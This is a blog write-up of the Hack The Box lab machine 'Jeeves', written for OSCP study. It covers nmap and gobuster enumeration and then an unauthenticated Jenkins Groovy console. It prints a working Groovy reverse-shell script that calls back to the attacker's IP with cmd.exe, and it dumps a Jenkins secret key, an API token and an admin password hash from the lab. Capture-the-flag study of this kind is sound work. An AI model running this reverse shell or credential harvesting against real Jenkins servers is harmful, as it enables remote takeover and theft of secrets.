---
layout: post
title:  "Write Up: Hack The Box - Jeeves"
date:   2024-08-14 12:47:39 -0400
categories: oscp windows priv-esc tcm-security course
---

10.10.10.63
me - 10.10.14.35

As always we kick off with an nmap scan which returns the following:

```
└─$ sudo nmap -sC -sV -p- -oA jeeves 10.10.10.63                                                                   
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 18:46 EDT
Nmap scan report for 10.10.10.63
Host is up (0.020s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-17T03:48:45
|_  start_date: 2024-08-17T03:41:27
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h59m02s, deviation: 0s, median: 4h59m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.52 seconds
```

Going to also kick off an autorecon scan now to do more thorough scans. Anywhooooo going to try and see if we cab;t get some sweet smb action going; I tried a couple basics to see if I can get any info but not able to do anonymous login so kinda limited at the moment, might be able to get into it later so putting a pin in it for now.

[screenshot]

Loading this bad boi up in the browser we get an askjeeves landing page:

[screenshot - jeeves landing]

but after trying a couple searches I keep getting this same exception back:

[screenshot - jeeves failing]

Opening up port 5000 in the browser returns an error page:

[screenshot - 5000 err]

So quickly running out of options from the nmap search, doing to run a dirsearch and some gobuster searches to see what other tasty tidbits we can turn up.

```
gobuster dir -u http://10.10.10.63/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 503]
/Index.html           (Status: 200) [Size: 503]
/error.html           (Status: 200) [Size: 50]
/INDEX.html           (Status: 200) [Size: 503]
/Error.html           (Status: 200) [Size: 50]

gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]

```

Hitting http://10.10.10.63:50000/askjeeves brings up a jenkins page....lol. After doing some digging for a bit I was able to get to teh groovy script console without logging in and found one that I was able to use to get a reverse shell after some minor changes to work with windows:

```
String host="10.10.14.17";
int port=4444;
String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

another option - https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html






secret.key
```
58d05496da2496d09036d36c99b56f1e89cc662f3e65a4023de71de7e1df8afb
```






```
C:\Users\Administrator\.jenkins\users\admin>type config.xml
type config.xml
<?xml version='1.0' encoding='UTF-8'?>
<user>
  <fullName>admin</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <apiToken>{AQAAABAAAAAwID3cR3pyZaEkaDPU25Z0S+nrU8+gDgB0JEWORJ5L1P2T+zXc/tSs2IVn1ugWLaui54D6yYki4vhXQtGhqUSeFw==}</apiToken>
    </jenkins.security.ApiTokenProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1509762882255</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```

